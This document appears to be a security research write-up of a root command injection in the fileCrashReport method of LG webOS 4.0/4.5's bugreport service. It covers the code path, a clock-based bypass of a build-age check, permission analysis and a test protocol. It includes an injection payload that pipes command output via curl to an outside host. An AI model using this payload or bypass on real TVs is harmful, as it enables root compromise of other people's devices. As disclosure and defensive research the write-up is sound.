# Command injection in `com.palm.service.bugreport/fileCrashReport`

Static analysis, LG webOS 4.0 and 4.5. No runtime test was performed.

## 1. Summary

`fileCrashReport` accepts `filepath` and `filename` from any luna client that has the required
permission. `filepath` is concatenated into a shell command executed with `exec()` by a service
started as root. A client that can call the luna method can therefore run a command as root.

The method is reachable from a temporary web app launched over SSAP (`webapp/launchWebApp`) whose
page gets `PalmServiceBridge`; the client context has the `private` and `public` permissions.

## 2. Affected firmware

| Firmware | webOS | OTA | Model | Service | Code |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 05.70.55 | 3.4.3 | W16K | B6 | not found (partial extraction) | — |
| 06.10.65 | 3.5 | W17H | B7 | absent | — |
| **05.50.70** | **4.0** | **W18O** | **C8** | **present** | **vulnerable** |
| **05.50.00** | **4.5** | **W19O** | **C9** | **present** | **vulnerable** |
| 04.64.00 | 5.0 | W20O | CX | absent | — |
| 03.53.45 | 6.0 | W21O | C1 | absent | — |

The 4.0 and 4.5 EPKs are dated 2025-04-29 and 2025-09-18: the latest builds of these branches
still contain the vulnerable code. The service is not tied to a SoC: C8 and C9 share `o18`, while
CX (`o20`) and C1 (`o20n`) do not have it.

## 3. Code path

Service directory: `usr/palm/services/com.palm.service.bugreport/`.

`bugreport-service.js`:

```js
// line 366
function fileCrashReport(message) { ... fileCrashReportInternal(message, configManager); }

// line 377
if (!params || !params.filename || !params.filepath) { ... }

// line 400
var filenamePattern = /[\|&;\$%@"<>\(\)\+,]/;
if (filenamePattern.test(params.filename)) { ... "Invalid Log File Name" ... }

// line 487
crashReport = managers.getRdxManager().createCrashReport(params.filename, params.filepath, null);
```

`rdx-manager.js`:

```js
// line 279
function CrashReport(fromFile, fromDir, destDir) {
  var file = fromDir ? path.join(fromDir, fromFile) : path.join(CRASH_LOGFILES_DIR, fromFile);
  RdxLog.apply(this, [file, null, destDir]);
}

// line 56
function createLogFiles(file, dest, callback) {
  if (file) {
    cmd = "rm -rf " + dest + "; mkdir -p " + dest + "; tar zxf " + file + " -C " + dest;
    cmd += "; tar zxf " + path.join(dest, "syslog.tar.gz") + " -C " + dest;
  }
  exec(cmd, ...);   // /bin/sh -c
}
```

Call chain:

```
fileCrashReport
  -> fileCrashReportInternal
     -> createCrashReport(params.filename, params.filepath)
        -> new CrashReport -> RdxLog.apply(file, null, dest)
           -> createLogFiles(file, dest)
              -> exec("... tar zxf " + file + " ...")
```

Injection example:

```
filepath = "/tmp; id | curl -s -d@- http://192.0.2.20:9090/result; #"
filename = "poc"
```

`path.join` gives `/tmp; id | curl ...; #/poc`; the shell executes `tar zxf /tmp` (fails), then
`id | curl ...`, then `#` comments the rest.

## 4. Gates and bypass

1. **Crash reporting enabled**: `config-manager.js` default is `{key:
   "isCrashReportingEnabled", value: true}`.
2. **Image name**: `webos.getImageName()` must match `-(flash|secured|image)$`. A stock TV passes.
3. **Build age**: `webos.isOlderThan(getBuildMaxAge())` reads `/etc/version` (first 8 chars
   `YYYYMMDD`) and compares to `now - buildMaxAge`. Default `buildMaxAge = 5` **days**
   (`config-manager.js:222`). A TV whose build is older than 5 days returns
   “TV is running a build too old to report crashes” before `createCrashReport`.
4. **Clock bypass**: `com.webos.service.systemservice/time/setSystemTime` is provided with the
   `private`, `settings` and `time` groups. Its handler
   `TimePrefsHandler::cbSetSystemTime` (LunaSysService, Thumb `0x445d8` on 4.0) parses
   `{"utc": <seconds>}` and calls `systemSetTime`; it contains no caller check. Setting the clock
   a few days after the build date makes the age check pass. The Settings app uses the same
   payload (`com.palm.app.settings/main.js`, `parameters:{utc:Math.floor(e)}`).
5. **Permissions**: `com.palm.service.bugreport/fileCrashReport` is listed as `public` and
   `private` in `compat.api.json`, and as `system.debug` in the service API file.
   `GroupsMap::AddProvided` in luna-service2 appends groups (it does not replace), so the method
   is provided with the union `{public, private, system.debug}`. The web app host has
   `["private","public"]` in `client-permissions.d/com.webos.app.webapphost.app.json`.
   The intersection is non-empty, so the call is allowed.
6. **Service user**: `services.d/com.palm.service.bugreport.service` has
   `Exec=/usr/palm/services/com.palm.service.bugreport/run-bugreport-service` and no `User=`.
   luna-service2 launches services with `g_spawn_async_with_pipes` without setuid/setgid
   (`hub.cpp:427`), so the node process inherits root. This is inferred, not observed.

## 5. Version boundaries

- The service is **absent** in 3.5 (B7, W17H) and appears in 4.0 (C8, W18O).
- It is still **present and vulnerable** in 4.5 (C9, W19O), including the 2025 build.
- It is **absent** in 5.0 (CX, W20O) and 6.0 (C1, W21O).
- Therefore the affected range is webOS **4.0–4.5**: 2018 and 2019 models.

Offline check: extract the EPK with `epk2extract`, then run `tools/check_bugreport.py` on the
extracted rootfs. It reports the service directory, the `exec` line, the `filepath` reads and the
permission groups.

## 6. Test protocol

1. Identify the TV: webOS 4.0/4.5, 2018–2019 model. Confirm the service:
   ```sh
   ls /usr/palm/services/com.palm.service.bugreport 2>/dev/null   # root shell, optional
   ```
2. Determine the build date (`/etc/version` if root, otherwise the LG firmware release page).
   Compute `build + 1 day` as epoch seconds.
3. Run `poc/poc.py --tv <TV_IP> --local-ip <PC_IP> --utc <epoch>`, accept pairing.
4. The page:
   - disables `autoClock` via `com.webos.settingsservice/setSystemSettings`
     (category `time`);
   - calls `setSystemTime` with the chosen timestamp;
   - calls `fileCrashReport` with the injected `filepath`.
5. Expected: the harness receives `uid=0(root) ...` on `/result`.
6. Rollback: `autoClock:on` or reboot (NTP resync). `/tmp` is cleared on reboot.

Failure interpretation:

| Reply | Meaning |
| :--- | :--- |
| `Permission denied` | the client context on this firmware differs |
| `build too old` | clock bypass did not apply; check timestamp and `autoClock` |
| `no such service` | not a 4.0/4.5 TV |
| `Invalid payload parameters` | `filepath`/`filename` missing |

## 7. Limits and open questions

- No runtime proof: the exact `buildMaxAge` value in the TV database, the effect of
  `setSystemTime` under network time, and the real service uid are unverified.
- The PoC changes the system clock; this is reversible but must be documented.
- The command runs through `exec`, so the `filepath` string must survive JSON encoding and
  `path.join`. The default payload does.
- Later 4.0/4.5 builds could patch the JavaScript. The latest 2025 builds do not.

## 8. Disclosure

This repository is a research artifact for owners of affected TVs. It does not include any
LG proprietary code beyond short excerpts required to document the vulnerability.

## Prior art / CVE check

This is **not** CVE-2023-6318. That CVE is a command injection in
`com.webos.service.cloudupload/processAnalyticsReport` on webOS 5 through 7.

The Bitdefender webOS research (April 2024) covers four different issues:

| CVE | Service | Versions |
| :--- | :--- | :--- |
| CVE-2023-6317 | `secondscreen.gateway` (pairing prompt bypass) | 4–7 |
| CVE-2023-6318 | `com.webos.service.cloudupload/processAnalyticsReport` | 5–7 |
| CVE-2023-6319 | `com.webos.service.attachedstoragemanager/getAudioMetadata` | 4–7 |
| CVE-2023-6320 | `com.webos.service.connectionmanager/tv/setVlanStaticAddress` | 5–6 |

None of them mentions `com.palm.service.bugreport` or `fileCrashReport`. NVD keyword
searches for `fileCrashReport` and `com.palm.service.bugreport` return no CVE (checked
2026-10-22). This finding is the same *class* of bug (unsanitized path passed to a shell),
but a different service and a different version range.
